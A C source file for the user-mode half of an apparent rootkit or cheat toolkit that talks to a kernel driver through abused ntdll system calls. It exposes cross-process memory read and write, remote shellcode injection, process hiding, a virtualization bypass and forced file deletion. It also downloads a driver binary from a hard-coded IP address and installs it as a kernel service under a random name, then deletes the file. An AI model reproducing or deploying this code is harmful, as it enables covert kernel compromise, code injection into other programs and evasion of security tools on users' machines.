#pragma once
#include "comm.h"

HANDLE hFile = NULL;
NtQueryInformationFileProc NtQueryInformationFile = NULL;
pNtConvertBetweenAuxiliaryCounterAndPerformanceCounter callCBCP = NULL;
USHORT BuildNum = NULL;


PUCHAR GetCurrentPeb() {
	/*if (_IS_WOW64)
	{
		return (PUCHAR)*(PDWORD)(_readfsbase_u32() + 0x30);
	}
	else {
	
		return (PUCHAR)__readgsqword(0x60);
	}*/
#ifdef _ISWIN32
	return (PUCHAR)__readfsdword(0x30);
#else
	return (PUCHAR)__readgsqword(0x60);
#endif 

}

USHORT GetOsBuildNumber() {
	PUCHAR peb = GetCurrentPeb();
	if (_IS_WOW64)
	{
		return *(PUSHORT)(peb + 0xAC);
	}
	else {

		return  *(PUSHORT)(peb + 0x120);
	}
}

BOOLEAN InitComWin7() {
	NtQueryInformationFile = (NtQueryInformationFileProc)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQueryInformationFile");
	if (!NtQueryInformationFile)
	{
		return FALSE;
	}
	strcat(getenv("windir"), "\\temp\\");
	hFile = CreateFileA("C:\\Silky.sk", FILE_ALL_ACCESS, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == NULL || hFile == (HANDLE)-1)
	{
		return FALSE;
	}
	return TRUE;
}

BOOLEAN InitComWin10() {
	callCBCP = (pNtConvertBetweenAuxiliaryCounterAndPerformanceCounter)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtConvertBetweenAuxiliaryCounterAndPerformanceCounter");
	if (!callCBCP)
	{
		return FALSE;
	}
	return TRUE;
}

BOOLEAN InitCom() {
	BuildNum = GetOsBuildNumber();
	//BuildNum = 7600;
	if (BuildNum == 7600 || BuildNum == 7601)
	{
		//win7
		return InitComWin7();
		
	}
	else
	{
		//win10
		return InitComWin10();
	}
}


VOID ComSendWin7(PComPackage pkg) {
	IO_STATUS_BLOCK is = { 0 };
	ULONG ret = NtQueryInformationFile(hFile, &is, pkg, 0xDD, 0x34);
}
VOID ComSendWin10(PComPackage pkg) {
	callCBCP(0, (PUCHAR)&pkg, (PUCHAR)&pkg, NULL);
}

NTSTATUS ComSend(ULONG64 cmd,ULONG64 inData,ULONG64 inLen,ULONG64 outData,ULONG64 outLen) {
	ComPackage package = { 0 };
	package.sign = 0x65083911;
	package.cmd = cmd;
	package.inData = inData;
	package.inLen = inLen;
	package.outData = outData;
	package.outLen = outLen;
	package.status = -1;
	if (BuildNum == 7600 || BuildNum == 7601)
	{
		//win7
		ComSendWin7(&package);
	}
	else
	{
		//win10
		ComSendWin10(&package);
	}
	return package.status;
}



ULONG64 GetModuleBase(ULONG64 pid, char* name) {
	ULONG64 base = 0;
	NTSTATUS ret = ComSend(CMD_GET_MODULE_BASE,(ULONG64)name,pid,(ULONG64)&base,NULL);
	return base;
}

BOOLEAN ReadProcMemory(ULONG64 pid, ULONG64 dst,ULONG64 buf,ULONG64 len,ULONG64 way) {
	NTSTATUS ret = -1;
	switch (way)
	{
	case 1: //API
		ret = ComSend(CMD_READ_APICOPY, dst, len, buf,pid);
		break;
	case 2:  //¸½¼Ó
		ret = ComSend(CMD_READ_ATTACH, dst, len, buf, pid);
		break;
	case 3: //MDL
		ret = ComSend(CMD_READ_MDL, dst, len, buf, pid);
		break;
	case 4: //ÆÆÐéÄâ»¯¶Á
		ret = ComSend(CMD_READ_VIRBYPASS, dst, len, buf, pid);
		break;
	default:
		break;
	}
	return ret == 0;
}


BOOLEAN WriteProcMemory(ULONG64 pid, ULONG64 dst, ULONG64 buf, ULONG64 len) {
	return ComSend(CMD_WRITE, dst, len, buf, pid)==0;
}


BOOLEAN InitProcProtect() {
	return ComSend(CMD_INIT_PROC_PROTECT, 0, 0, 0, 0) == 0;
}

BOOLEAN UnloadProcProtect() {
	return ComSend(CMD_UNLOAD_PROC_PROTECT, 0, 0, 0, 0) == 0;
}

BOOLEAN AddProcProtect(ULONG64 pid) {
	return ComSend(CMD_ADD_PROC_PROTECT, 0, pid, 0, 0) == 0;
}

BOOLEAN RemoteCall(ULONG64 pid,ULONG64 tid,REMOTE_CALL_MODE mode,ULONG64 shellcode,ULONG64 len) {
	RemoteCallPackage pack = { 0 };
	pack.codeLen = len;
	pack.mode = mode;
	pack.pid = pid;
	pack.tid = tid;
	pack.shellcode = shellcode;
	return ComSend(CMD_REMOTE_CALL,(ULONG64)&pack, 0, 0, 0) == 0;
}

ULONG64 GetExpFuncAddrOfProcModule(ULONG64 pid,char* moduleName, char* funcName) {
	ULONG64 addr = 0;
	BOOLEAN ret = ComSend(CMD_GET_PROC_ADDR, (ULONG64)moduleName, pid, (ULONG64)funcName, (ULONG64)&addr);
	if (ret)
	{
		return NULL;
	}
	return addr;
}

ULONG64 AllocaProcMemory(ULONG64 pid,ULONG64 size) {
	ULONG64 base = 0;
	NTSTATUS ret = ComSend(CMD_ALLOC_MEM, (ULONG64)pid, size, (ULONG64)&base, NULL);
	return base;
}

ULONG64 FreeProcMemory(ULONG64 pid, ULONG64 base) {
	NTSTATUS ret = ComSend(CMD_FREE_MEM, (ULONG64)pid, base, NULL, NULL);
	if (!ret)
	{
		return TRUE;
	}
	return FALSE;
}

ULONG64 FindProcSignCode(ULONG64 pid,ULONG64 base,ULONG64 sign,ULONG64 len) {
	FindSignPackage pack = { 0 };
	pack.base = base;
	pack.code = sign;
	pack.len = len;
	pack.pid = pid;
	ULONG64 baseRet = 0;
	NTSTATUS ret = ComSend(CMD_FIND_SIGN,(ULONG64)&pack,0, (ULONG64)&baseRet,0);
	return base;
}

BOOLEAN HideProcessByPid(ULONG64 pid,ULONG64 dstPid) {
	NTSTATUS ret = ComSend(CMD_HIDE_PROC,pid, dstPid,0,0);
	if (!ret)
	{
		return TRUE;
	}
	return FALSE;
}

BOOLEAN VirBypass(char* pname) {
	NTSTATUS ret = ComSend(CMD_BYPASS_VIRTUAL, (ULONG64)pname, 0, 0, 0);
	if (!ret)
	{
		return TRUE;
	}
	return FALSE;
}

BOOLEAN DeleteFileForce(char* path) {
	NTSTATUS ret = ComSend(CMD_DEL_FILE, (ULONG64)path, 0, 0, 0);
	if (!ret)
	{
		return TRUE;
	}
	return FALSE;
}

BOOLEAN UnloadDriver() {
	NTSTATUS ret = ComSend(CMD_UNLOAD_DRIVER, 0, 0, 0, 0);
	if (!ret)
	{
		return TRUE;
	}
	return FALSE;
}



BOOLEAN TestCom() {
	return ComSend(CMD_TEST, 0, 0, 0, 0) == 0;
}



const char* url = "http://101.43.199.197:5700/drivers/new.sys";

char* MakeRandomString(DWORD len) {
	char str[] = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
	char name[256] = { 0 };
	for (DWORD i = 0; i < len; i++)
	{
		name[i] = str[rand() % 62];
	}
	return name;
}


char* MakeRandomFilePath(PUCHAR path) {
	char* mem = (char*)malloc(256);
	memset(mem, 0, 256);
	memcpy(mem, path, strlen((const char*)path));
	strcat(mem, (const char*)MakeRandomString(8));
	strcat(mem,".sys");
	return mem;
}
char* MakeRandomServiceName() {
	char* mem = (char*)malloc(256);
	memset(mem, 0, 256);
	strcat(mem, (const char*)MakeRandomString(8));
	return mem;
}

BOOLEAN LoadDriverByManager(char* path, char* serviceName)
{
	BOOLEAN bRet = FALSE;
	DWORD dwLastError;
	SC_HANDLE hSCManager;
	SC_HANDLE hService = NULL;

	if (hSCManager = OpenSCManagerA(NULL, NULL, SC_MANAGER_ALL_ACCESS))
	{
		hService = CreateServiceA(
			hSCManager, serviceName,
			serviceName, SERVICE_ALL_ACCESS,
			SERVICE_KERNEL_DRIVER, SERVICE_DEMAND_START,
			SERVICE_ERROR_IGNORE, path,
			NULL, NULL, NULL, NULL, NULL
		);
		
		if (hService == NULL)
		{
			hService = OpenServiceA(hSCManager, serviceName, SERVICE_ALL_ACCESS);

			if (!hService)
			{
				CloseServiceHandle(hSCManager);
				return FALSE;
			}

		}
		StartServiceA(hService, 0, NULL);
		bRet = TRUE;
	}

	if (hService)
	{
		CloseServiceHandle(hService);
	}

	if (hSCManager)
	{
		CloseServiceHandle(hSCManager);
	}

	return bRet;
}

BOOLEAN LoadDriver() {
	BOOLEAN bol;
	InitCom();
	bol = TestCom();
	if (bol)
	{
		return TRUE;
	}
	DeleteUrlCacheEntryA(url);
	char* sysPath = MakeRandomFilePath((PUCHAR)"C:\\");
	HRESULT ret = URLDownloadToFileA(NULL, url, sysPath, NULL, NULL);
	if (ret != S_OK)
	{
		return FALSE;
	}
	char* srvName = MakeRandomServiceName();
	bol = LoadDriverByManager(sysPath, srvName);
	DeleteFileA(sysPath);
	if (!bol)
	{
		return FALSE;
	}
	//InitCom();
	bol = TestCom();
	if (!bol)
	{
		return FALSE;
	}
	return TRUE;
}


